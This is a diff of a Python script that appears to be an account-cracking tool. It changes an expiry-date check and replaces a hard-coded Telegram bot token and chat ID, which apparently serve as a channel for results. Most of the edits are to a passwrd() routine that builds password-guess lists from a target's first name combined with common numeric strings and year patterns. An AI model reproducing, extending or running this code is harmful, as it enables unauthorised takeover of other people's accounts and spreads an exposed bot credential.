@@ -14,7 +14,7 @@ t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)
 
 hours = (now.hour)
 x = datetime.datetime.now()
-g= datetime.datetime(2023, 8, 30, 12, 10 ,9)
+g= datetime.datetime(2023, 8, 27, 12, 10 ,9)
 
 
 if (x.strftime("%x"))>(g.strftime("%x")):
@@ -90,7 +90,7 @@ B = '\033[2;36m'
 G = '\033[1;32m'
 S = '\033[1;33m'
 print('\n')
-token=('6169368790:AAF-PyjSq3FF5IjWsk44CKDLaJjH97COgbM')
+token=('6385664119:AAGchr6pOj6D2hlqOZUlhvyUjtUwmW7hrO8')
 print('\n')
 ID=('1350971290')
 os.system('clear')
@@ -1044,7 +1044,7 @@ def passwrd():
 					pwv.append(frs+'12345')
 					pwv.append('112233445566')
 					pwv.append('1122334455')
-					pwv.append(frs+'123456')
+					pwv.append('123456')
 					pwv.append('1234512345')
 					pwv.append('00998877')
 					pwv.append('11223344')
@@ -1053,13 +1053,14 @@ def passwrd():
 					pwv.append('19901990')
 					pwv.append('19911991')
 					pwv.append('19921992')
-					pwv.append(frs+'1234567')
-					pwv.append(frs+'12345678')
-					pwv.append(frs+'123456789')
+					pwv.append('19931993')
+					pwv.append('19941994')
+					pwv.append('19951995')
 					pwv.append('19961996')
 					pwv.append('19971997')
 					pwv.append('19981998')
 					pwv.append('19991999')
+			else:
 				if len(frs)<3:
 					pwv.append(nmf)
 				else:
@@ -1069,7 +1070,7 @@ def passwrd():
 					pwv.append(frs+'12345')
 					pwv.append('112233445566')
 					pwv.append('1122334455')
-					pwv.append(frs+'123456')
+					pwv.append('123456')
 					pwv.append('1234512345')
 					pwv.append('00998877')
 					pwv.append('11223344')
@@ -1078,9 +1079,9 @@ def passwrd():
 					pwv.append('19901990')
 					pwv.append('19911991')
 					pwv.append('19921992')
-					pwv.append(frs+'1234567')
-					pwv.append(frs+'12345678')
-					pwv.append(frs+'123456789')
+					pwv.append('19931993')
+					pwv.append('19941994')
+					pwv.append('19951995')
 					pwv.append('19961996')
 					pwv.append('19971997')
 					pwv.append('19981998')
